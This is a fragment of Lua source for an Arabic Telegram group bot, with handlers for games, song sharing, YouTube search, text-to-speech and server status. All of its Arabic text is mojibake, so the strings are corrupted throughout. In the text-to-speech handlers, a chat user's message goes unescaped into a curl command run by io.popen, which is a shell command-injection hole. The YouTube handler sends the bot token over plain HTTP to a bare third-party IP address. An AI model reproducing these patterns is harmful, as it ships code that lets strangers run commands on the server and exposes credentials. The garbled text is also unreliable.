if text == "ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ" or text == 'ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ¬ΩΨ§Ω' then
if Admin(msg) then 
database:set(bot_id.."my_gmal:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ¬ΩΨ§Ω") 
return false end
end
if text == "ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ" or text == "Ψ¬ΩΨ§ΩΩ" then
local my_gm = database:get(bot_id.."my_gmal:status"..msg.chat_id_)
if my_gm then
send(msg.chat_id_, msg.id_," Ω­ ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ ΩΨΉΨ·ΩΩ") 
return false 
end
if DevBot(msg) then
local function mahmoud(extra, mahmoud, success)
if mahmoud.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,mahmoud.photos_[0].sizes_[1].photo_.persistent_id_," ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ ΩΩ 500% \nΨΉΨ΄Ψ§Ω ΩΨ·ΩΨ± ΩΩΨ―Ψ§ ΩΨ§Ψ²Ω Ψ§Ψ·Ψ¨ΩΩ πΉβ₯\n" )
else
send(msg.chat_id_, msg.id_,'ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ±Ω ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω', 1, 'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, mahmoud, nil)
else
local function mahmoud(extra, mahmoud, success)
local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
if mahmoud.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,mahmoud.photos_[0].sizes_[1].photo_.persistent_id_," ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ ΩΩ "..rdbhoto.."πβ₯" )
else
send(msg.chat_id_, msg.id_,'ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ±Ω ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω', 1, 'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, mahmoud, nil)
end
end


if text == "ΩΩ Ψ?ΩΨ±ΩΩ" or text == "Ψ?ΩΨ±ΩΩ" then
local khirok_Msg = {
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ¨ΩΨ§Ψ‘ ΩΨ―Ω Ψ§ΩΨ­ΩΨ§Ψ© ΩΨΉ Ψ£Ψ?ΩΩ Ψ£Ω Ψ§ΩΨ¨ΩΨ§Ψ‘ ΩΨ―Ω Ψ§ΩΨ­ΩΨ§Ψ© ΩΨΉ Ψ­Ψ¨ΩΨ¨Ω ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ ΨΉΨ±ΨΆΩΨ§ ΨΉΩΩΩ Ψ§ΩΨ³ΩΨ± ΩΩΨ―Ψ© 20 ΨΉΨ§Ω ΩΨΉ Ψ΄Ψ?Ψ΅ ΩΨ§Ψ­Ψ― ΩΩΨ· ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"Ψ§ΩΩ ΨͺΨ­Ψ¨ Ψ£ΩΨ«Ψ± ΩΨ§ΩΨ―Ω Ψ£Ω ΩΨ§ΩΨ―ΨͺΩΨ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ₯ΨΉΨ·Ψ§Ψ‘ ΩΨ―ΩΨ© Ψ¨Ψ§ΩΨΈΨ© Ψ§ΩΨ«ΩΩ ΩΩΨ±Ψ― ΩΩ Ψ£ΩΨ±Ψ§Ψ― Ψ£Ψ³Ψ±ΨͺΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ°ΩΨ§Ψ‘ Ψ£Ω Ψ§ΩΨ«Ψ±Ψ§Ψ‘ ΩΨ§Ψ°Ψ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ²ΩΨ§Ψ¬ ΩΩ Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨Ω Ψ£Ω Ψ΄Ψ?Ψ΅ Ψ³ΩΨ­ΩΩ ΩΩ Ψ¬ΩΩΨΉ Ψ£Ψ­ΩΨ§ΩΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΩΩΩΨ« ΩΨ―Ω Ψ§ΩΨ­ΩΨ§Ψ© ΩΨΉ Ψ΅Ψ―ΩΩΩ Ψ§ΩΩΩΨΆΩ Ψ£Ω ΩΨΉ Ψ­Ψ¨ΩΨ¨Ω ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ΄ΩΨ§Ψ―Ψ© Ψ§ΩΨ¬Ψ§ΩΨΉΩΨ© Ψ£Ω Ψ§ΩΨ³ΩΨ± Ψ­ΩΩ Ψ§ΩΨΉΨ§ΩΩΨ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨΉΩΨ΄ ΩΩ ΩΩΩΩΩΨ±Ω Ψ£Ω ΩΩ ΩΩΨ―Ω Ψ£ΩΩΩΨ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨΉΩΨ―Ψ© Ψ₯ΩΩ Ψ§ΩΩΨ§ΨΆΩ Ψ£Ω Ψ§ΩΨ°ΩΨ§Ψ¨ Ψ₯ΩΩ Ψ§ΩΩΨ³ΨͺΩΨ¨Ω Ψ£ΩΩΩΨ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ ΨͺΩΨͺΨΉ Ψ΄Ψ±ΩΩ Ψ­ΩΨ§ΨͺΩ Ψ¨Ψ΅ΩΨ© ΩΩ Ψ§ΩΨ£Ψ«ΩΩΩ Ψ§ΩΨ·ΩΨ¨Ψ© Ψ£Ω Ψ­Ψ³Ω Ψ§ΩΨͺΨ΅Ψ±Ω Ψ£ΩΩΩΨ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ²ΩΨ§Ψ¬ ΩΩ Ψ΄Ψ?Ψ΅ ΩΩ ΨΉΩΨ±Ω ΩΩΩΨ± Ψ£Ω Ψ΄Ψ?Ψ΅ ΩΩΨ¨Ψ±Ω Ψ¨ΨΉΨ΄Ψ±ΩΩ ΨΉΨ§Ω ΨΊΩΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ ΩΨͺΩΩ Ψ¨Ψ§ΩΨ³Ω Ψ£Ω ΩΨͺΩΩ Ψ¨Ψ§ΩΩΨ³Ψ―Ψ³ ΩΨ§Ψ°Ψ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ₯ΩΩΨ§Ψ° ΩΨ§ΩΨ―Ω Ψ£Ω Ψ₯ΩΩΨ§Ψ° ΩΨ§ΩΨ―ΨͺΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
}
send(msg.chat_id_, msg.id_,'['..khirok_Msg[math.random(#khirok_Msg)]..']') 
return false
end
if text == "Ψ΅Ψ±Ψ§Ψ­Ω" or text == "Ψ¬Ψ±Ψ£Ω" then
local saraha_Msg = {
"ΩΩ ΨͺΨΉΨ±ΨΆΨͺ ΩΨΊΨ―Ψ± ΩΩ Ψ­ΩΨ§ΨͺΩΨ",
"ΩΩ ΨͺΨΉΨ±Ω ΨΉΩΩΨ¨ΩΨ",
"ΩΩ Ψ£ΩΨͺ ΩΩΨ³Ψ§ΩΨ­ Ψ£Ω ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ£Ω ΨͺΩΨ³Ψ§ΩΨ­Ψ",
"Ψ₯Ψ°Ψ§ ΩΩΨͺ Ψ¨Ψ§ΩΨ³ΩΨ± Ψ₯ΩΩ ΩΩΨ²ΩΨ© Ψ?Ψ§Ψ±Ψ¬ Ψ¨ΩΨ―Ω ΩΩΩ ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΩΨ­Ψ¨ Ψ£Ω ΩΩΨ±Ψ§ΩΩΩΨΩΩ ΨͺΨͺΨ―Ψ?Ω Ψ₯Ψ°Ψ§ ΩΨ¬Ψ―Ψͺ Ψ΄Ψ?Ψ΅ ΩΨͺΨΉΨ±ΨΆ ΩΨ­Ψ§Ψ―Ψ«Ψ© Ψ³ΩΨ± Ψ£Ω ΨͺΨͺΨ±ΩΩ ΩΨͺΨ±Ψ­ΩΨ",
"ΩΨ§ ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ£Ω ΨͺΨ±ΩΨΆ ΩΩ Ψ£Ω Ψ·ΩΨ¨Ψ",
"Ψ₯Ψ°Ψ§ Ψ£ΨΉΨ¬Ψ¨Ψͺ Ψ¨Ψ΄Ψ?Ψ΅Ω ΩΨ§Ψ ΩΩΩ ΨͺΩΨΈΩΨ± ΩΩ ΩΨ°Ψ§ Ψ§ΩΨ₯ΨΉΨ¬Ψ§Ψ¨ Ψ£Ω ΩΨ§ ΩΩ Ψ§ΩΨ·Ψ±ΩΩΨ© Ψ§ΩΨͺΩ Ψ³ΨͺΨͺΨ¨ΨΉΩΨ§ ΩΨͺΨΈΩΨ± Ψ₯ΨΉΨ¬Ψ§Ψ¨Ω Ψ¨ΩΨ",
"ΩΩ ΨͺΨ±Ω ΩΩΨ³Ω ΩΩΨͺΩΨ§ΩΨΆΩΨ",
"ΩΨ§ ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΨ°Ω ΨͺΨΉΨ±ΨΆΨͺ ΩΩΩ Ψ₯ΩΩ Ψ§ΩΨ§Ψ­Ψ±Ψ§Ψ¬ Ψ§ΩΩΩΨ¨Ψ±Ψ­Ψ",
"ΩΨ§ ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΨ°Ω Ψ¬ΨΉΩΩ ΨͺΨ¨ΩΩ Ψ£ΩΨ§Ω ΩΨ¬ΩΩΨΉΨ© ΩΩ Ψ§ΩΩΨ§Ψ³ Ψ±ΨΊΩΩΨ§ ΨΉΩΩΨ",
"Ψ₯Ψ°Ψ§ Ψ¬Ψ§Ψ‘ Ψ΄Ψ±ΩΩ Ψ­ΩΨ§ΨͺΩ ΩΨ·ΩΨ¨ Ψ§ΩΨ§ΩΩΨ΅Ψ§ΩΨ ΩΩΨ§Ψ°Ψ§ ΩΩΩΩ Ψ±Ψ―Ω ΩΩΨͺΩΨ",
"Ψ₯Ψ°Ψ§ ΩΨ§Ω ΩΨ§ΩΨ― ΩΨΉΩΩ Ψ¨ΨΉΩΩΩ ΩΩΩΨ± ΩΩ ΨͺΩΨ¨Ω Ψ¨Ω Ψ£Ω ΨͺΨ³ΨͺΨΉΨ± ΩΩΩΨ",
"ΩΨ§ Ψ§ΩΨ°Ω ΩΨ¬ΨΉΩΩ ΨͺΩΨ΅Ψ§Ψ¨ Ψ¨Ψ§ΩΨΊΨΆΨ¨ Ψ§ΩΨ΄Ψ―ΩΨ―Ψ",
"ΩΨ₯Ψ°Ψ§ ΩΨ¬Ψ―Ψͺ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω Ψ£Ψ­Ψ¨Ψ¨ΨͺΩΩ ΩΩ ΩΩΩΩ ΩΨ§ ΩΩΨ³Ω Ψ¨Ψ·ΩΩΩΨ ΩΩ ΩΨ°Ψ§ Ψ³ΩΨ΄ΨΉΨ±Ω Ψ¨Ψ§ΩΨ£ΩΩΨ",
"ΨΉΩΨ§ΩΨͺΩ ΩΨΉ Ψ§ΩΩΩ",
"Ψ«ΩΨ§Ψ«Ψ© Ψ£Ψ΄ΩΨ§Ψ‘ ΨͺΨ­Ψ¨ΩΨ§"
}
send(msg.chat_id_, msg.id_,'['..saraha_Msg[math.random(#saraha_Msg)]..']') 
return false
end
if text == 'ΩΩΨ²Ψ±' then
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
send(msg.chat_id_, msg.id_,"t.me/"..data.username_)
end,nil)
end
------by-7oda
if text == 'ΨΊΩΩΩΩ' then 
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
Text = 'Ψ§ΩΩΩ Ψ§ΨΊΩΩΩ ΨΉΨ΄ΩΨ§Ψ¦ΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΨΊΩΩΩ Ψ§Ψ?Ψ±Ω',callback_data=msg.sender_user_id_.."/ganyy"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendAudio?chat_id=' .. msg.chat_id_ .. '&audio=https://t.me/mmsst13/'..Rrr..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ΨΊΩΩΩΩ ΨͺΨ§ΩΨ± Ψ­Ψ³ΩΩ' then 
T = math.random(3,12)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΨΉΩΨ±Ω Ψ―ΩΨ§Ψ¨' then 
T = math.random(20,23)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΨͺΨ§ΩΨ± ΨΉΨ§Ψ΄ΩΨ±' then 
T = math.random(25,28)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΩΨ­ΩΨ― ΩΨ€Ψ§Ψ―' then 
T = math.random(30,38)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ Ψ­ΩΨ§ΩΩ' then 
T = math.random(51,61)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ Ψ§Ψ¨Ω Ψ§ΩΨ§ΩΩΨ§Ψ±' then 
T = math.random(63,67)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ Ψ±Ψ§ΩΩ Ψ΅Ψ¨Ψ±Ω' then 
T = math.random(69,73)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΩΨ³ΩΩ' then 
T = math.random(83,92)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΩΩΨ¬Ψ²' then 
T = math.random(94,102)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΨΉΩΨ§Ψ± Ψ­Ψ³ΩΩ' then 
T = math.random(104,110)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΨΉΩΨ¨Ω' then 
T = math.random(113,122)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΩΩΨ±Ψ¬Ψ§ΩΨ§Ψͺ' then 
T = math.random(124,133)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ Ψ§Ψ΅Ψ§ΩΩ' then 
T = math.random(135,147)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ Ψ§ΩΩΨ³Ψ§' then 
T = math.random(149,159)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΩΨ§ΩΨ±ΩΩΩ' then 
T = math.random(161,175)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ Ψ¨Ψ§Ψ¨ΩΩ' then 
T = math.random(177,183)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'ΨΊΩΩΩΩ ΩΨ­ΩΨ― ΩΩΩΨ±' then 
T = math.random(187,199)
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/emeuii/'..T..'') 
end
if text == 'Ψ΅ΩΨ±Ω' then
photo = 'https://t.me/bottestanubis/51'
sendph(msg.chat_id_,photo,msg.id_)
end
if text == 'ΨͺΩΩΨͺ Ψ¨Ψ§ΩΨ΅ΩΨ±' or text == 'ΩΨͺ ΨͺΩΩΨͺ Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' then
local Text =[[
β¨π
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Source Revor',url="t.me/revorb0t"}},
}
M = math.random(2,29)
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/wffhvv/'..M..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΩΨͺΩΩΨ¨" or text == 'ΨͺΨΉΨ·ΩΩ ΩΩΨͺΩΩΨ¨' then
if Admin(msg) then 
database:set(bot_id.."my_yt:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΩΨͺΩΩΨ¨ ") 
return false end
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΩΩΨͺΩΩΨ¨" or text == 'ΨͺΩΨΉΩΩ ΩΩΨͺΩΩΨ¨' then
if Admin(msg) then 
database:del(bot_id.."my_yt:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΩΨͺΩΩΨ¨") 
return false 
end
end
if text and text:match('^Ψ¨Ψ­Ψ« (.*)$') then            
local my_yt = database:get(bot_id.."my_yt:status"..msg.chat_id_)
if my_yt then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΩΩΨͺΩΩΨ¨ ΩΨΉΨ·Ω") 
return false 
end
local Ttext = text:match('^Ψ¨Ψ­Ψ« (.*)$') 
local msgin = msg.id_/2097152/0.5 
http.request('http://78.141.220.60/Yahya.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
end
if text and text ~="ΩΩΨͺΩΩΨ¨" and database:get(bot_id..":"..msg.sender_user_id_.."YTsearch"..msg.chat_id_) == "sendYTsearch" then
database:del(bot_id..":"..msg.sender_user_id_.."YTsearch"..msg.chat_id_)
local msgin = msg.id_/2097152/0.5 
http.request('http://78.141.220.60/Yahya.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(text)..'&msg='..msgin)
end
if text == "ΩΩΨͺΩΩΨ¨" or text == 'Ψ§ΩΩΩΨͺΩΩΨ¨' or text == 'Ψ¨Ψ­Ψ«' then 
local my_yt = database:get(bot_id.."my_yt:status"..msg.chat_id_)
if my_yt then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΩΩΨͺΩΩΨ¨ ΩΨΉΨ·Ω") 
return false 
end
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
database:set(bot_id..":"..msg.sender_user_id_.."YTsearch"..msg.chat_id_,"sendYTsearch")
local Text = "Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΨΊΩΩΩ ΩΩΨ¨Ψ­Ψ« ΨΉΩΩΨ§ ..."
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±', callback_data=msg.sender_user_id_.."/cancelY"},
},
{
{text = 'Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ¬ΩΩΨΉΨͺΩ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ·Ω" then
if Admin(msg) then 
database:set(bot_id.."intk"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ·Ω") 
return false 
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ω" then
if Admin(msg) then 
database:del(bot_id.."intk"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ω") 
return false end
end
if text and text:match("^Ψ§ΩΨ·Ω (.*)$") then 
local my_in = database:get(bot_id.."intk"..msg.chat_id_)
if not my_in then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΨ± Ψ§ΩΨ·Ω ΩΨΉΨ·Ω") 
return false 
end
local textntk = text:match("^Ψ§ΩΨ·Ω (.*)$")   
UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(textntk)..'')   
Antk = JSON.decode(UrlAntk)   
if UrlAntk.ok ~= false then   
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3')    
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendAudio'..'" -F "chat_id='.. msg.chat_id_ ..'" -F "audio=@'..''..textntk..'.mp3'..'"' io.popen(curlm) 
end   
end
if text and text ~="Ψ§ΩΨ·Ω" and database:get(bot_id..":"..msg.sender_user_id_.."intkk"..msg.chat_id_) == "sendintkk" then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_, 'Ω­ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ·Ω ')
database:del(bot_id..":"..msg.sender_user_id_.."intkk"..msg.chat_id_)
return false  
end 
UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text)..'')   
Antk = JSON.decode(UrlAntk)   
if UrlAntk.ok ~= false then   
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3')    
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendAudio'..'" -F "chat_id='.. msg.chat_id_ ..'" -F "audio=@'..''..text..'.mp3'..'"' io.popen(curlm) 
database:del(bot_id..":"..msg.sender_user_id_.."intkk"..msg.chat_id_)
end   
end
if text == 'Ψ§ΩΨ·Ω' or text == 'Ψ§ΩΩΨ·Ω' then  
local my_in = database:get(bot_id.."intk"..msg.chat_id_)
if not my_in then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΨ± Ψ§ΩΨ·Ω ΩΨΉΨ·Ω") 
return false 
end
database:set(bot_id..":"..msg.sender_user_id_.."intkk"..msg.chat_id_,"sendintkk")
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΩΩ ΩΩΨ·ΩΩΨ§ \nΩ­ Ψ§ΩΩΨ·Ω Ψ¨Ψ§ΩΩΨΊΩ : { en } ~ { ar } ')
end
----
if text == 'Ψ§ΩΨ³ΩΨ±ΩΨ±' and DevBot(msg) then
 ioserver = io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
 HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
 echo 'Ω­ { ΩΨΈΨ§Ω Ψ§ΩΨͺΨ΄ΨΊΩΩ } β°β’\n*Β»Β» '"$linux_version"'*' 
 echo '*------------------------------\n*Ω­ { Ψ§ΩΨ°Ψ§ΩΨ±Ω Ψ§ΩΨΉΨ΄ΩΨ§Ψ¦ΩΩ } β°β’\n*Β»Β» '"$memUsedPrc"'*'
 echo '*------------------------------\n*Ω­ { ΩΨ­ΩΨ―Ω Ψ§ΩΩΨͺΩΨ?ΩΨ²ΩΩΩ } β°β’\n*Β»Β» '"$HardDisk"'*'
 echo '*------------------------------\n*Ω­ { Ψ§ΩΩΩΩΩΨΉΩΩΨ§ΩΩΩΨ¬ } β°β’\n*Β»Β» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
 echo '*------------------------------\n*Ω­ { ΩΩΩΩΨΉ Ψ§ΩΩΨ³ΩΩΩΨ±ΩΩΨ± } β°β’\n*Β»Β» '`curl http://th3boss.com/ip/location`'*'
 echo '*------------------------------\n*Ω­ { Ψ§ΩΩΩΨ―Ψ?ΩΩΩΩ } β°β’\n*Β»Β» '`whoami`'*'
 echo '*------------------------------\n*Ω­ { ΩΩΨ―Ω ΨͺΩΨ΄ΨΊΩΩΩ Ψ§ΩΩΨ³ΩΩΩΨ±ΩΩΨ± } β°β’ \n*Β»Β» '"$uptime"'*'
 ]]):read('*all')
 send(msg.chat_id_, msg.id_,ioserver)
 return false
 end
if text and not database:get(bot_id.."AutoFile") then
Time = database:get(bot_id.."AutoFile:Time")
if Time then 
if Time ~= os.date("%x") then  
local list = database:smembers(bot_id..'Chek:Groups')  
local memo = database:smembers(bot_id..'UsersBot')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do      
NAME = 'Tshake Chat'
ASAS = database:smembers(bot_id.."Basic:Creator"..v)
MNSH = database:smembers(bot_id.."Creator"..v)
MDER = database:smembers(bot_id.."Manager"..v)
MOD = database:smembers(bot_id.."Mod:User"..v)
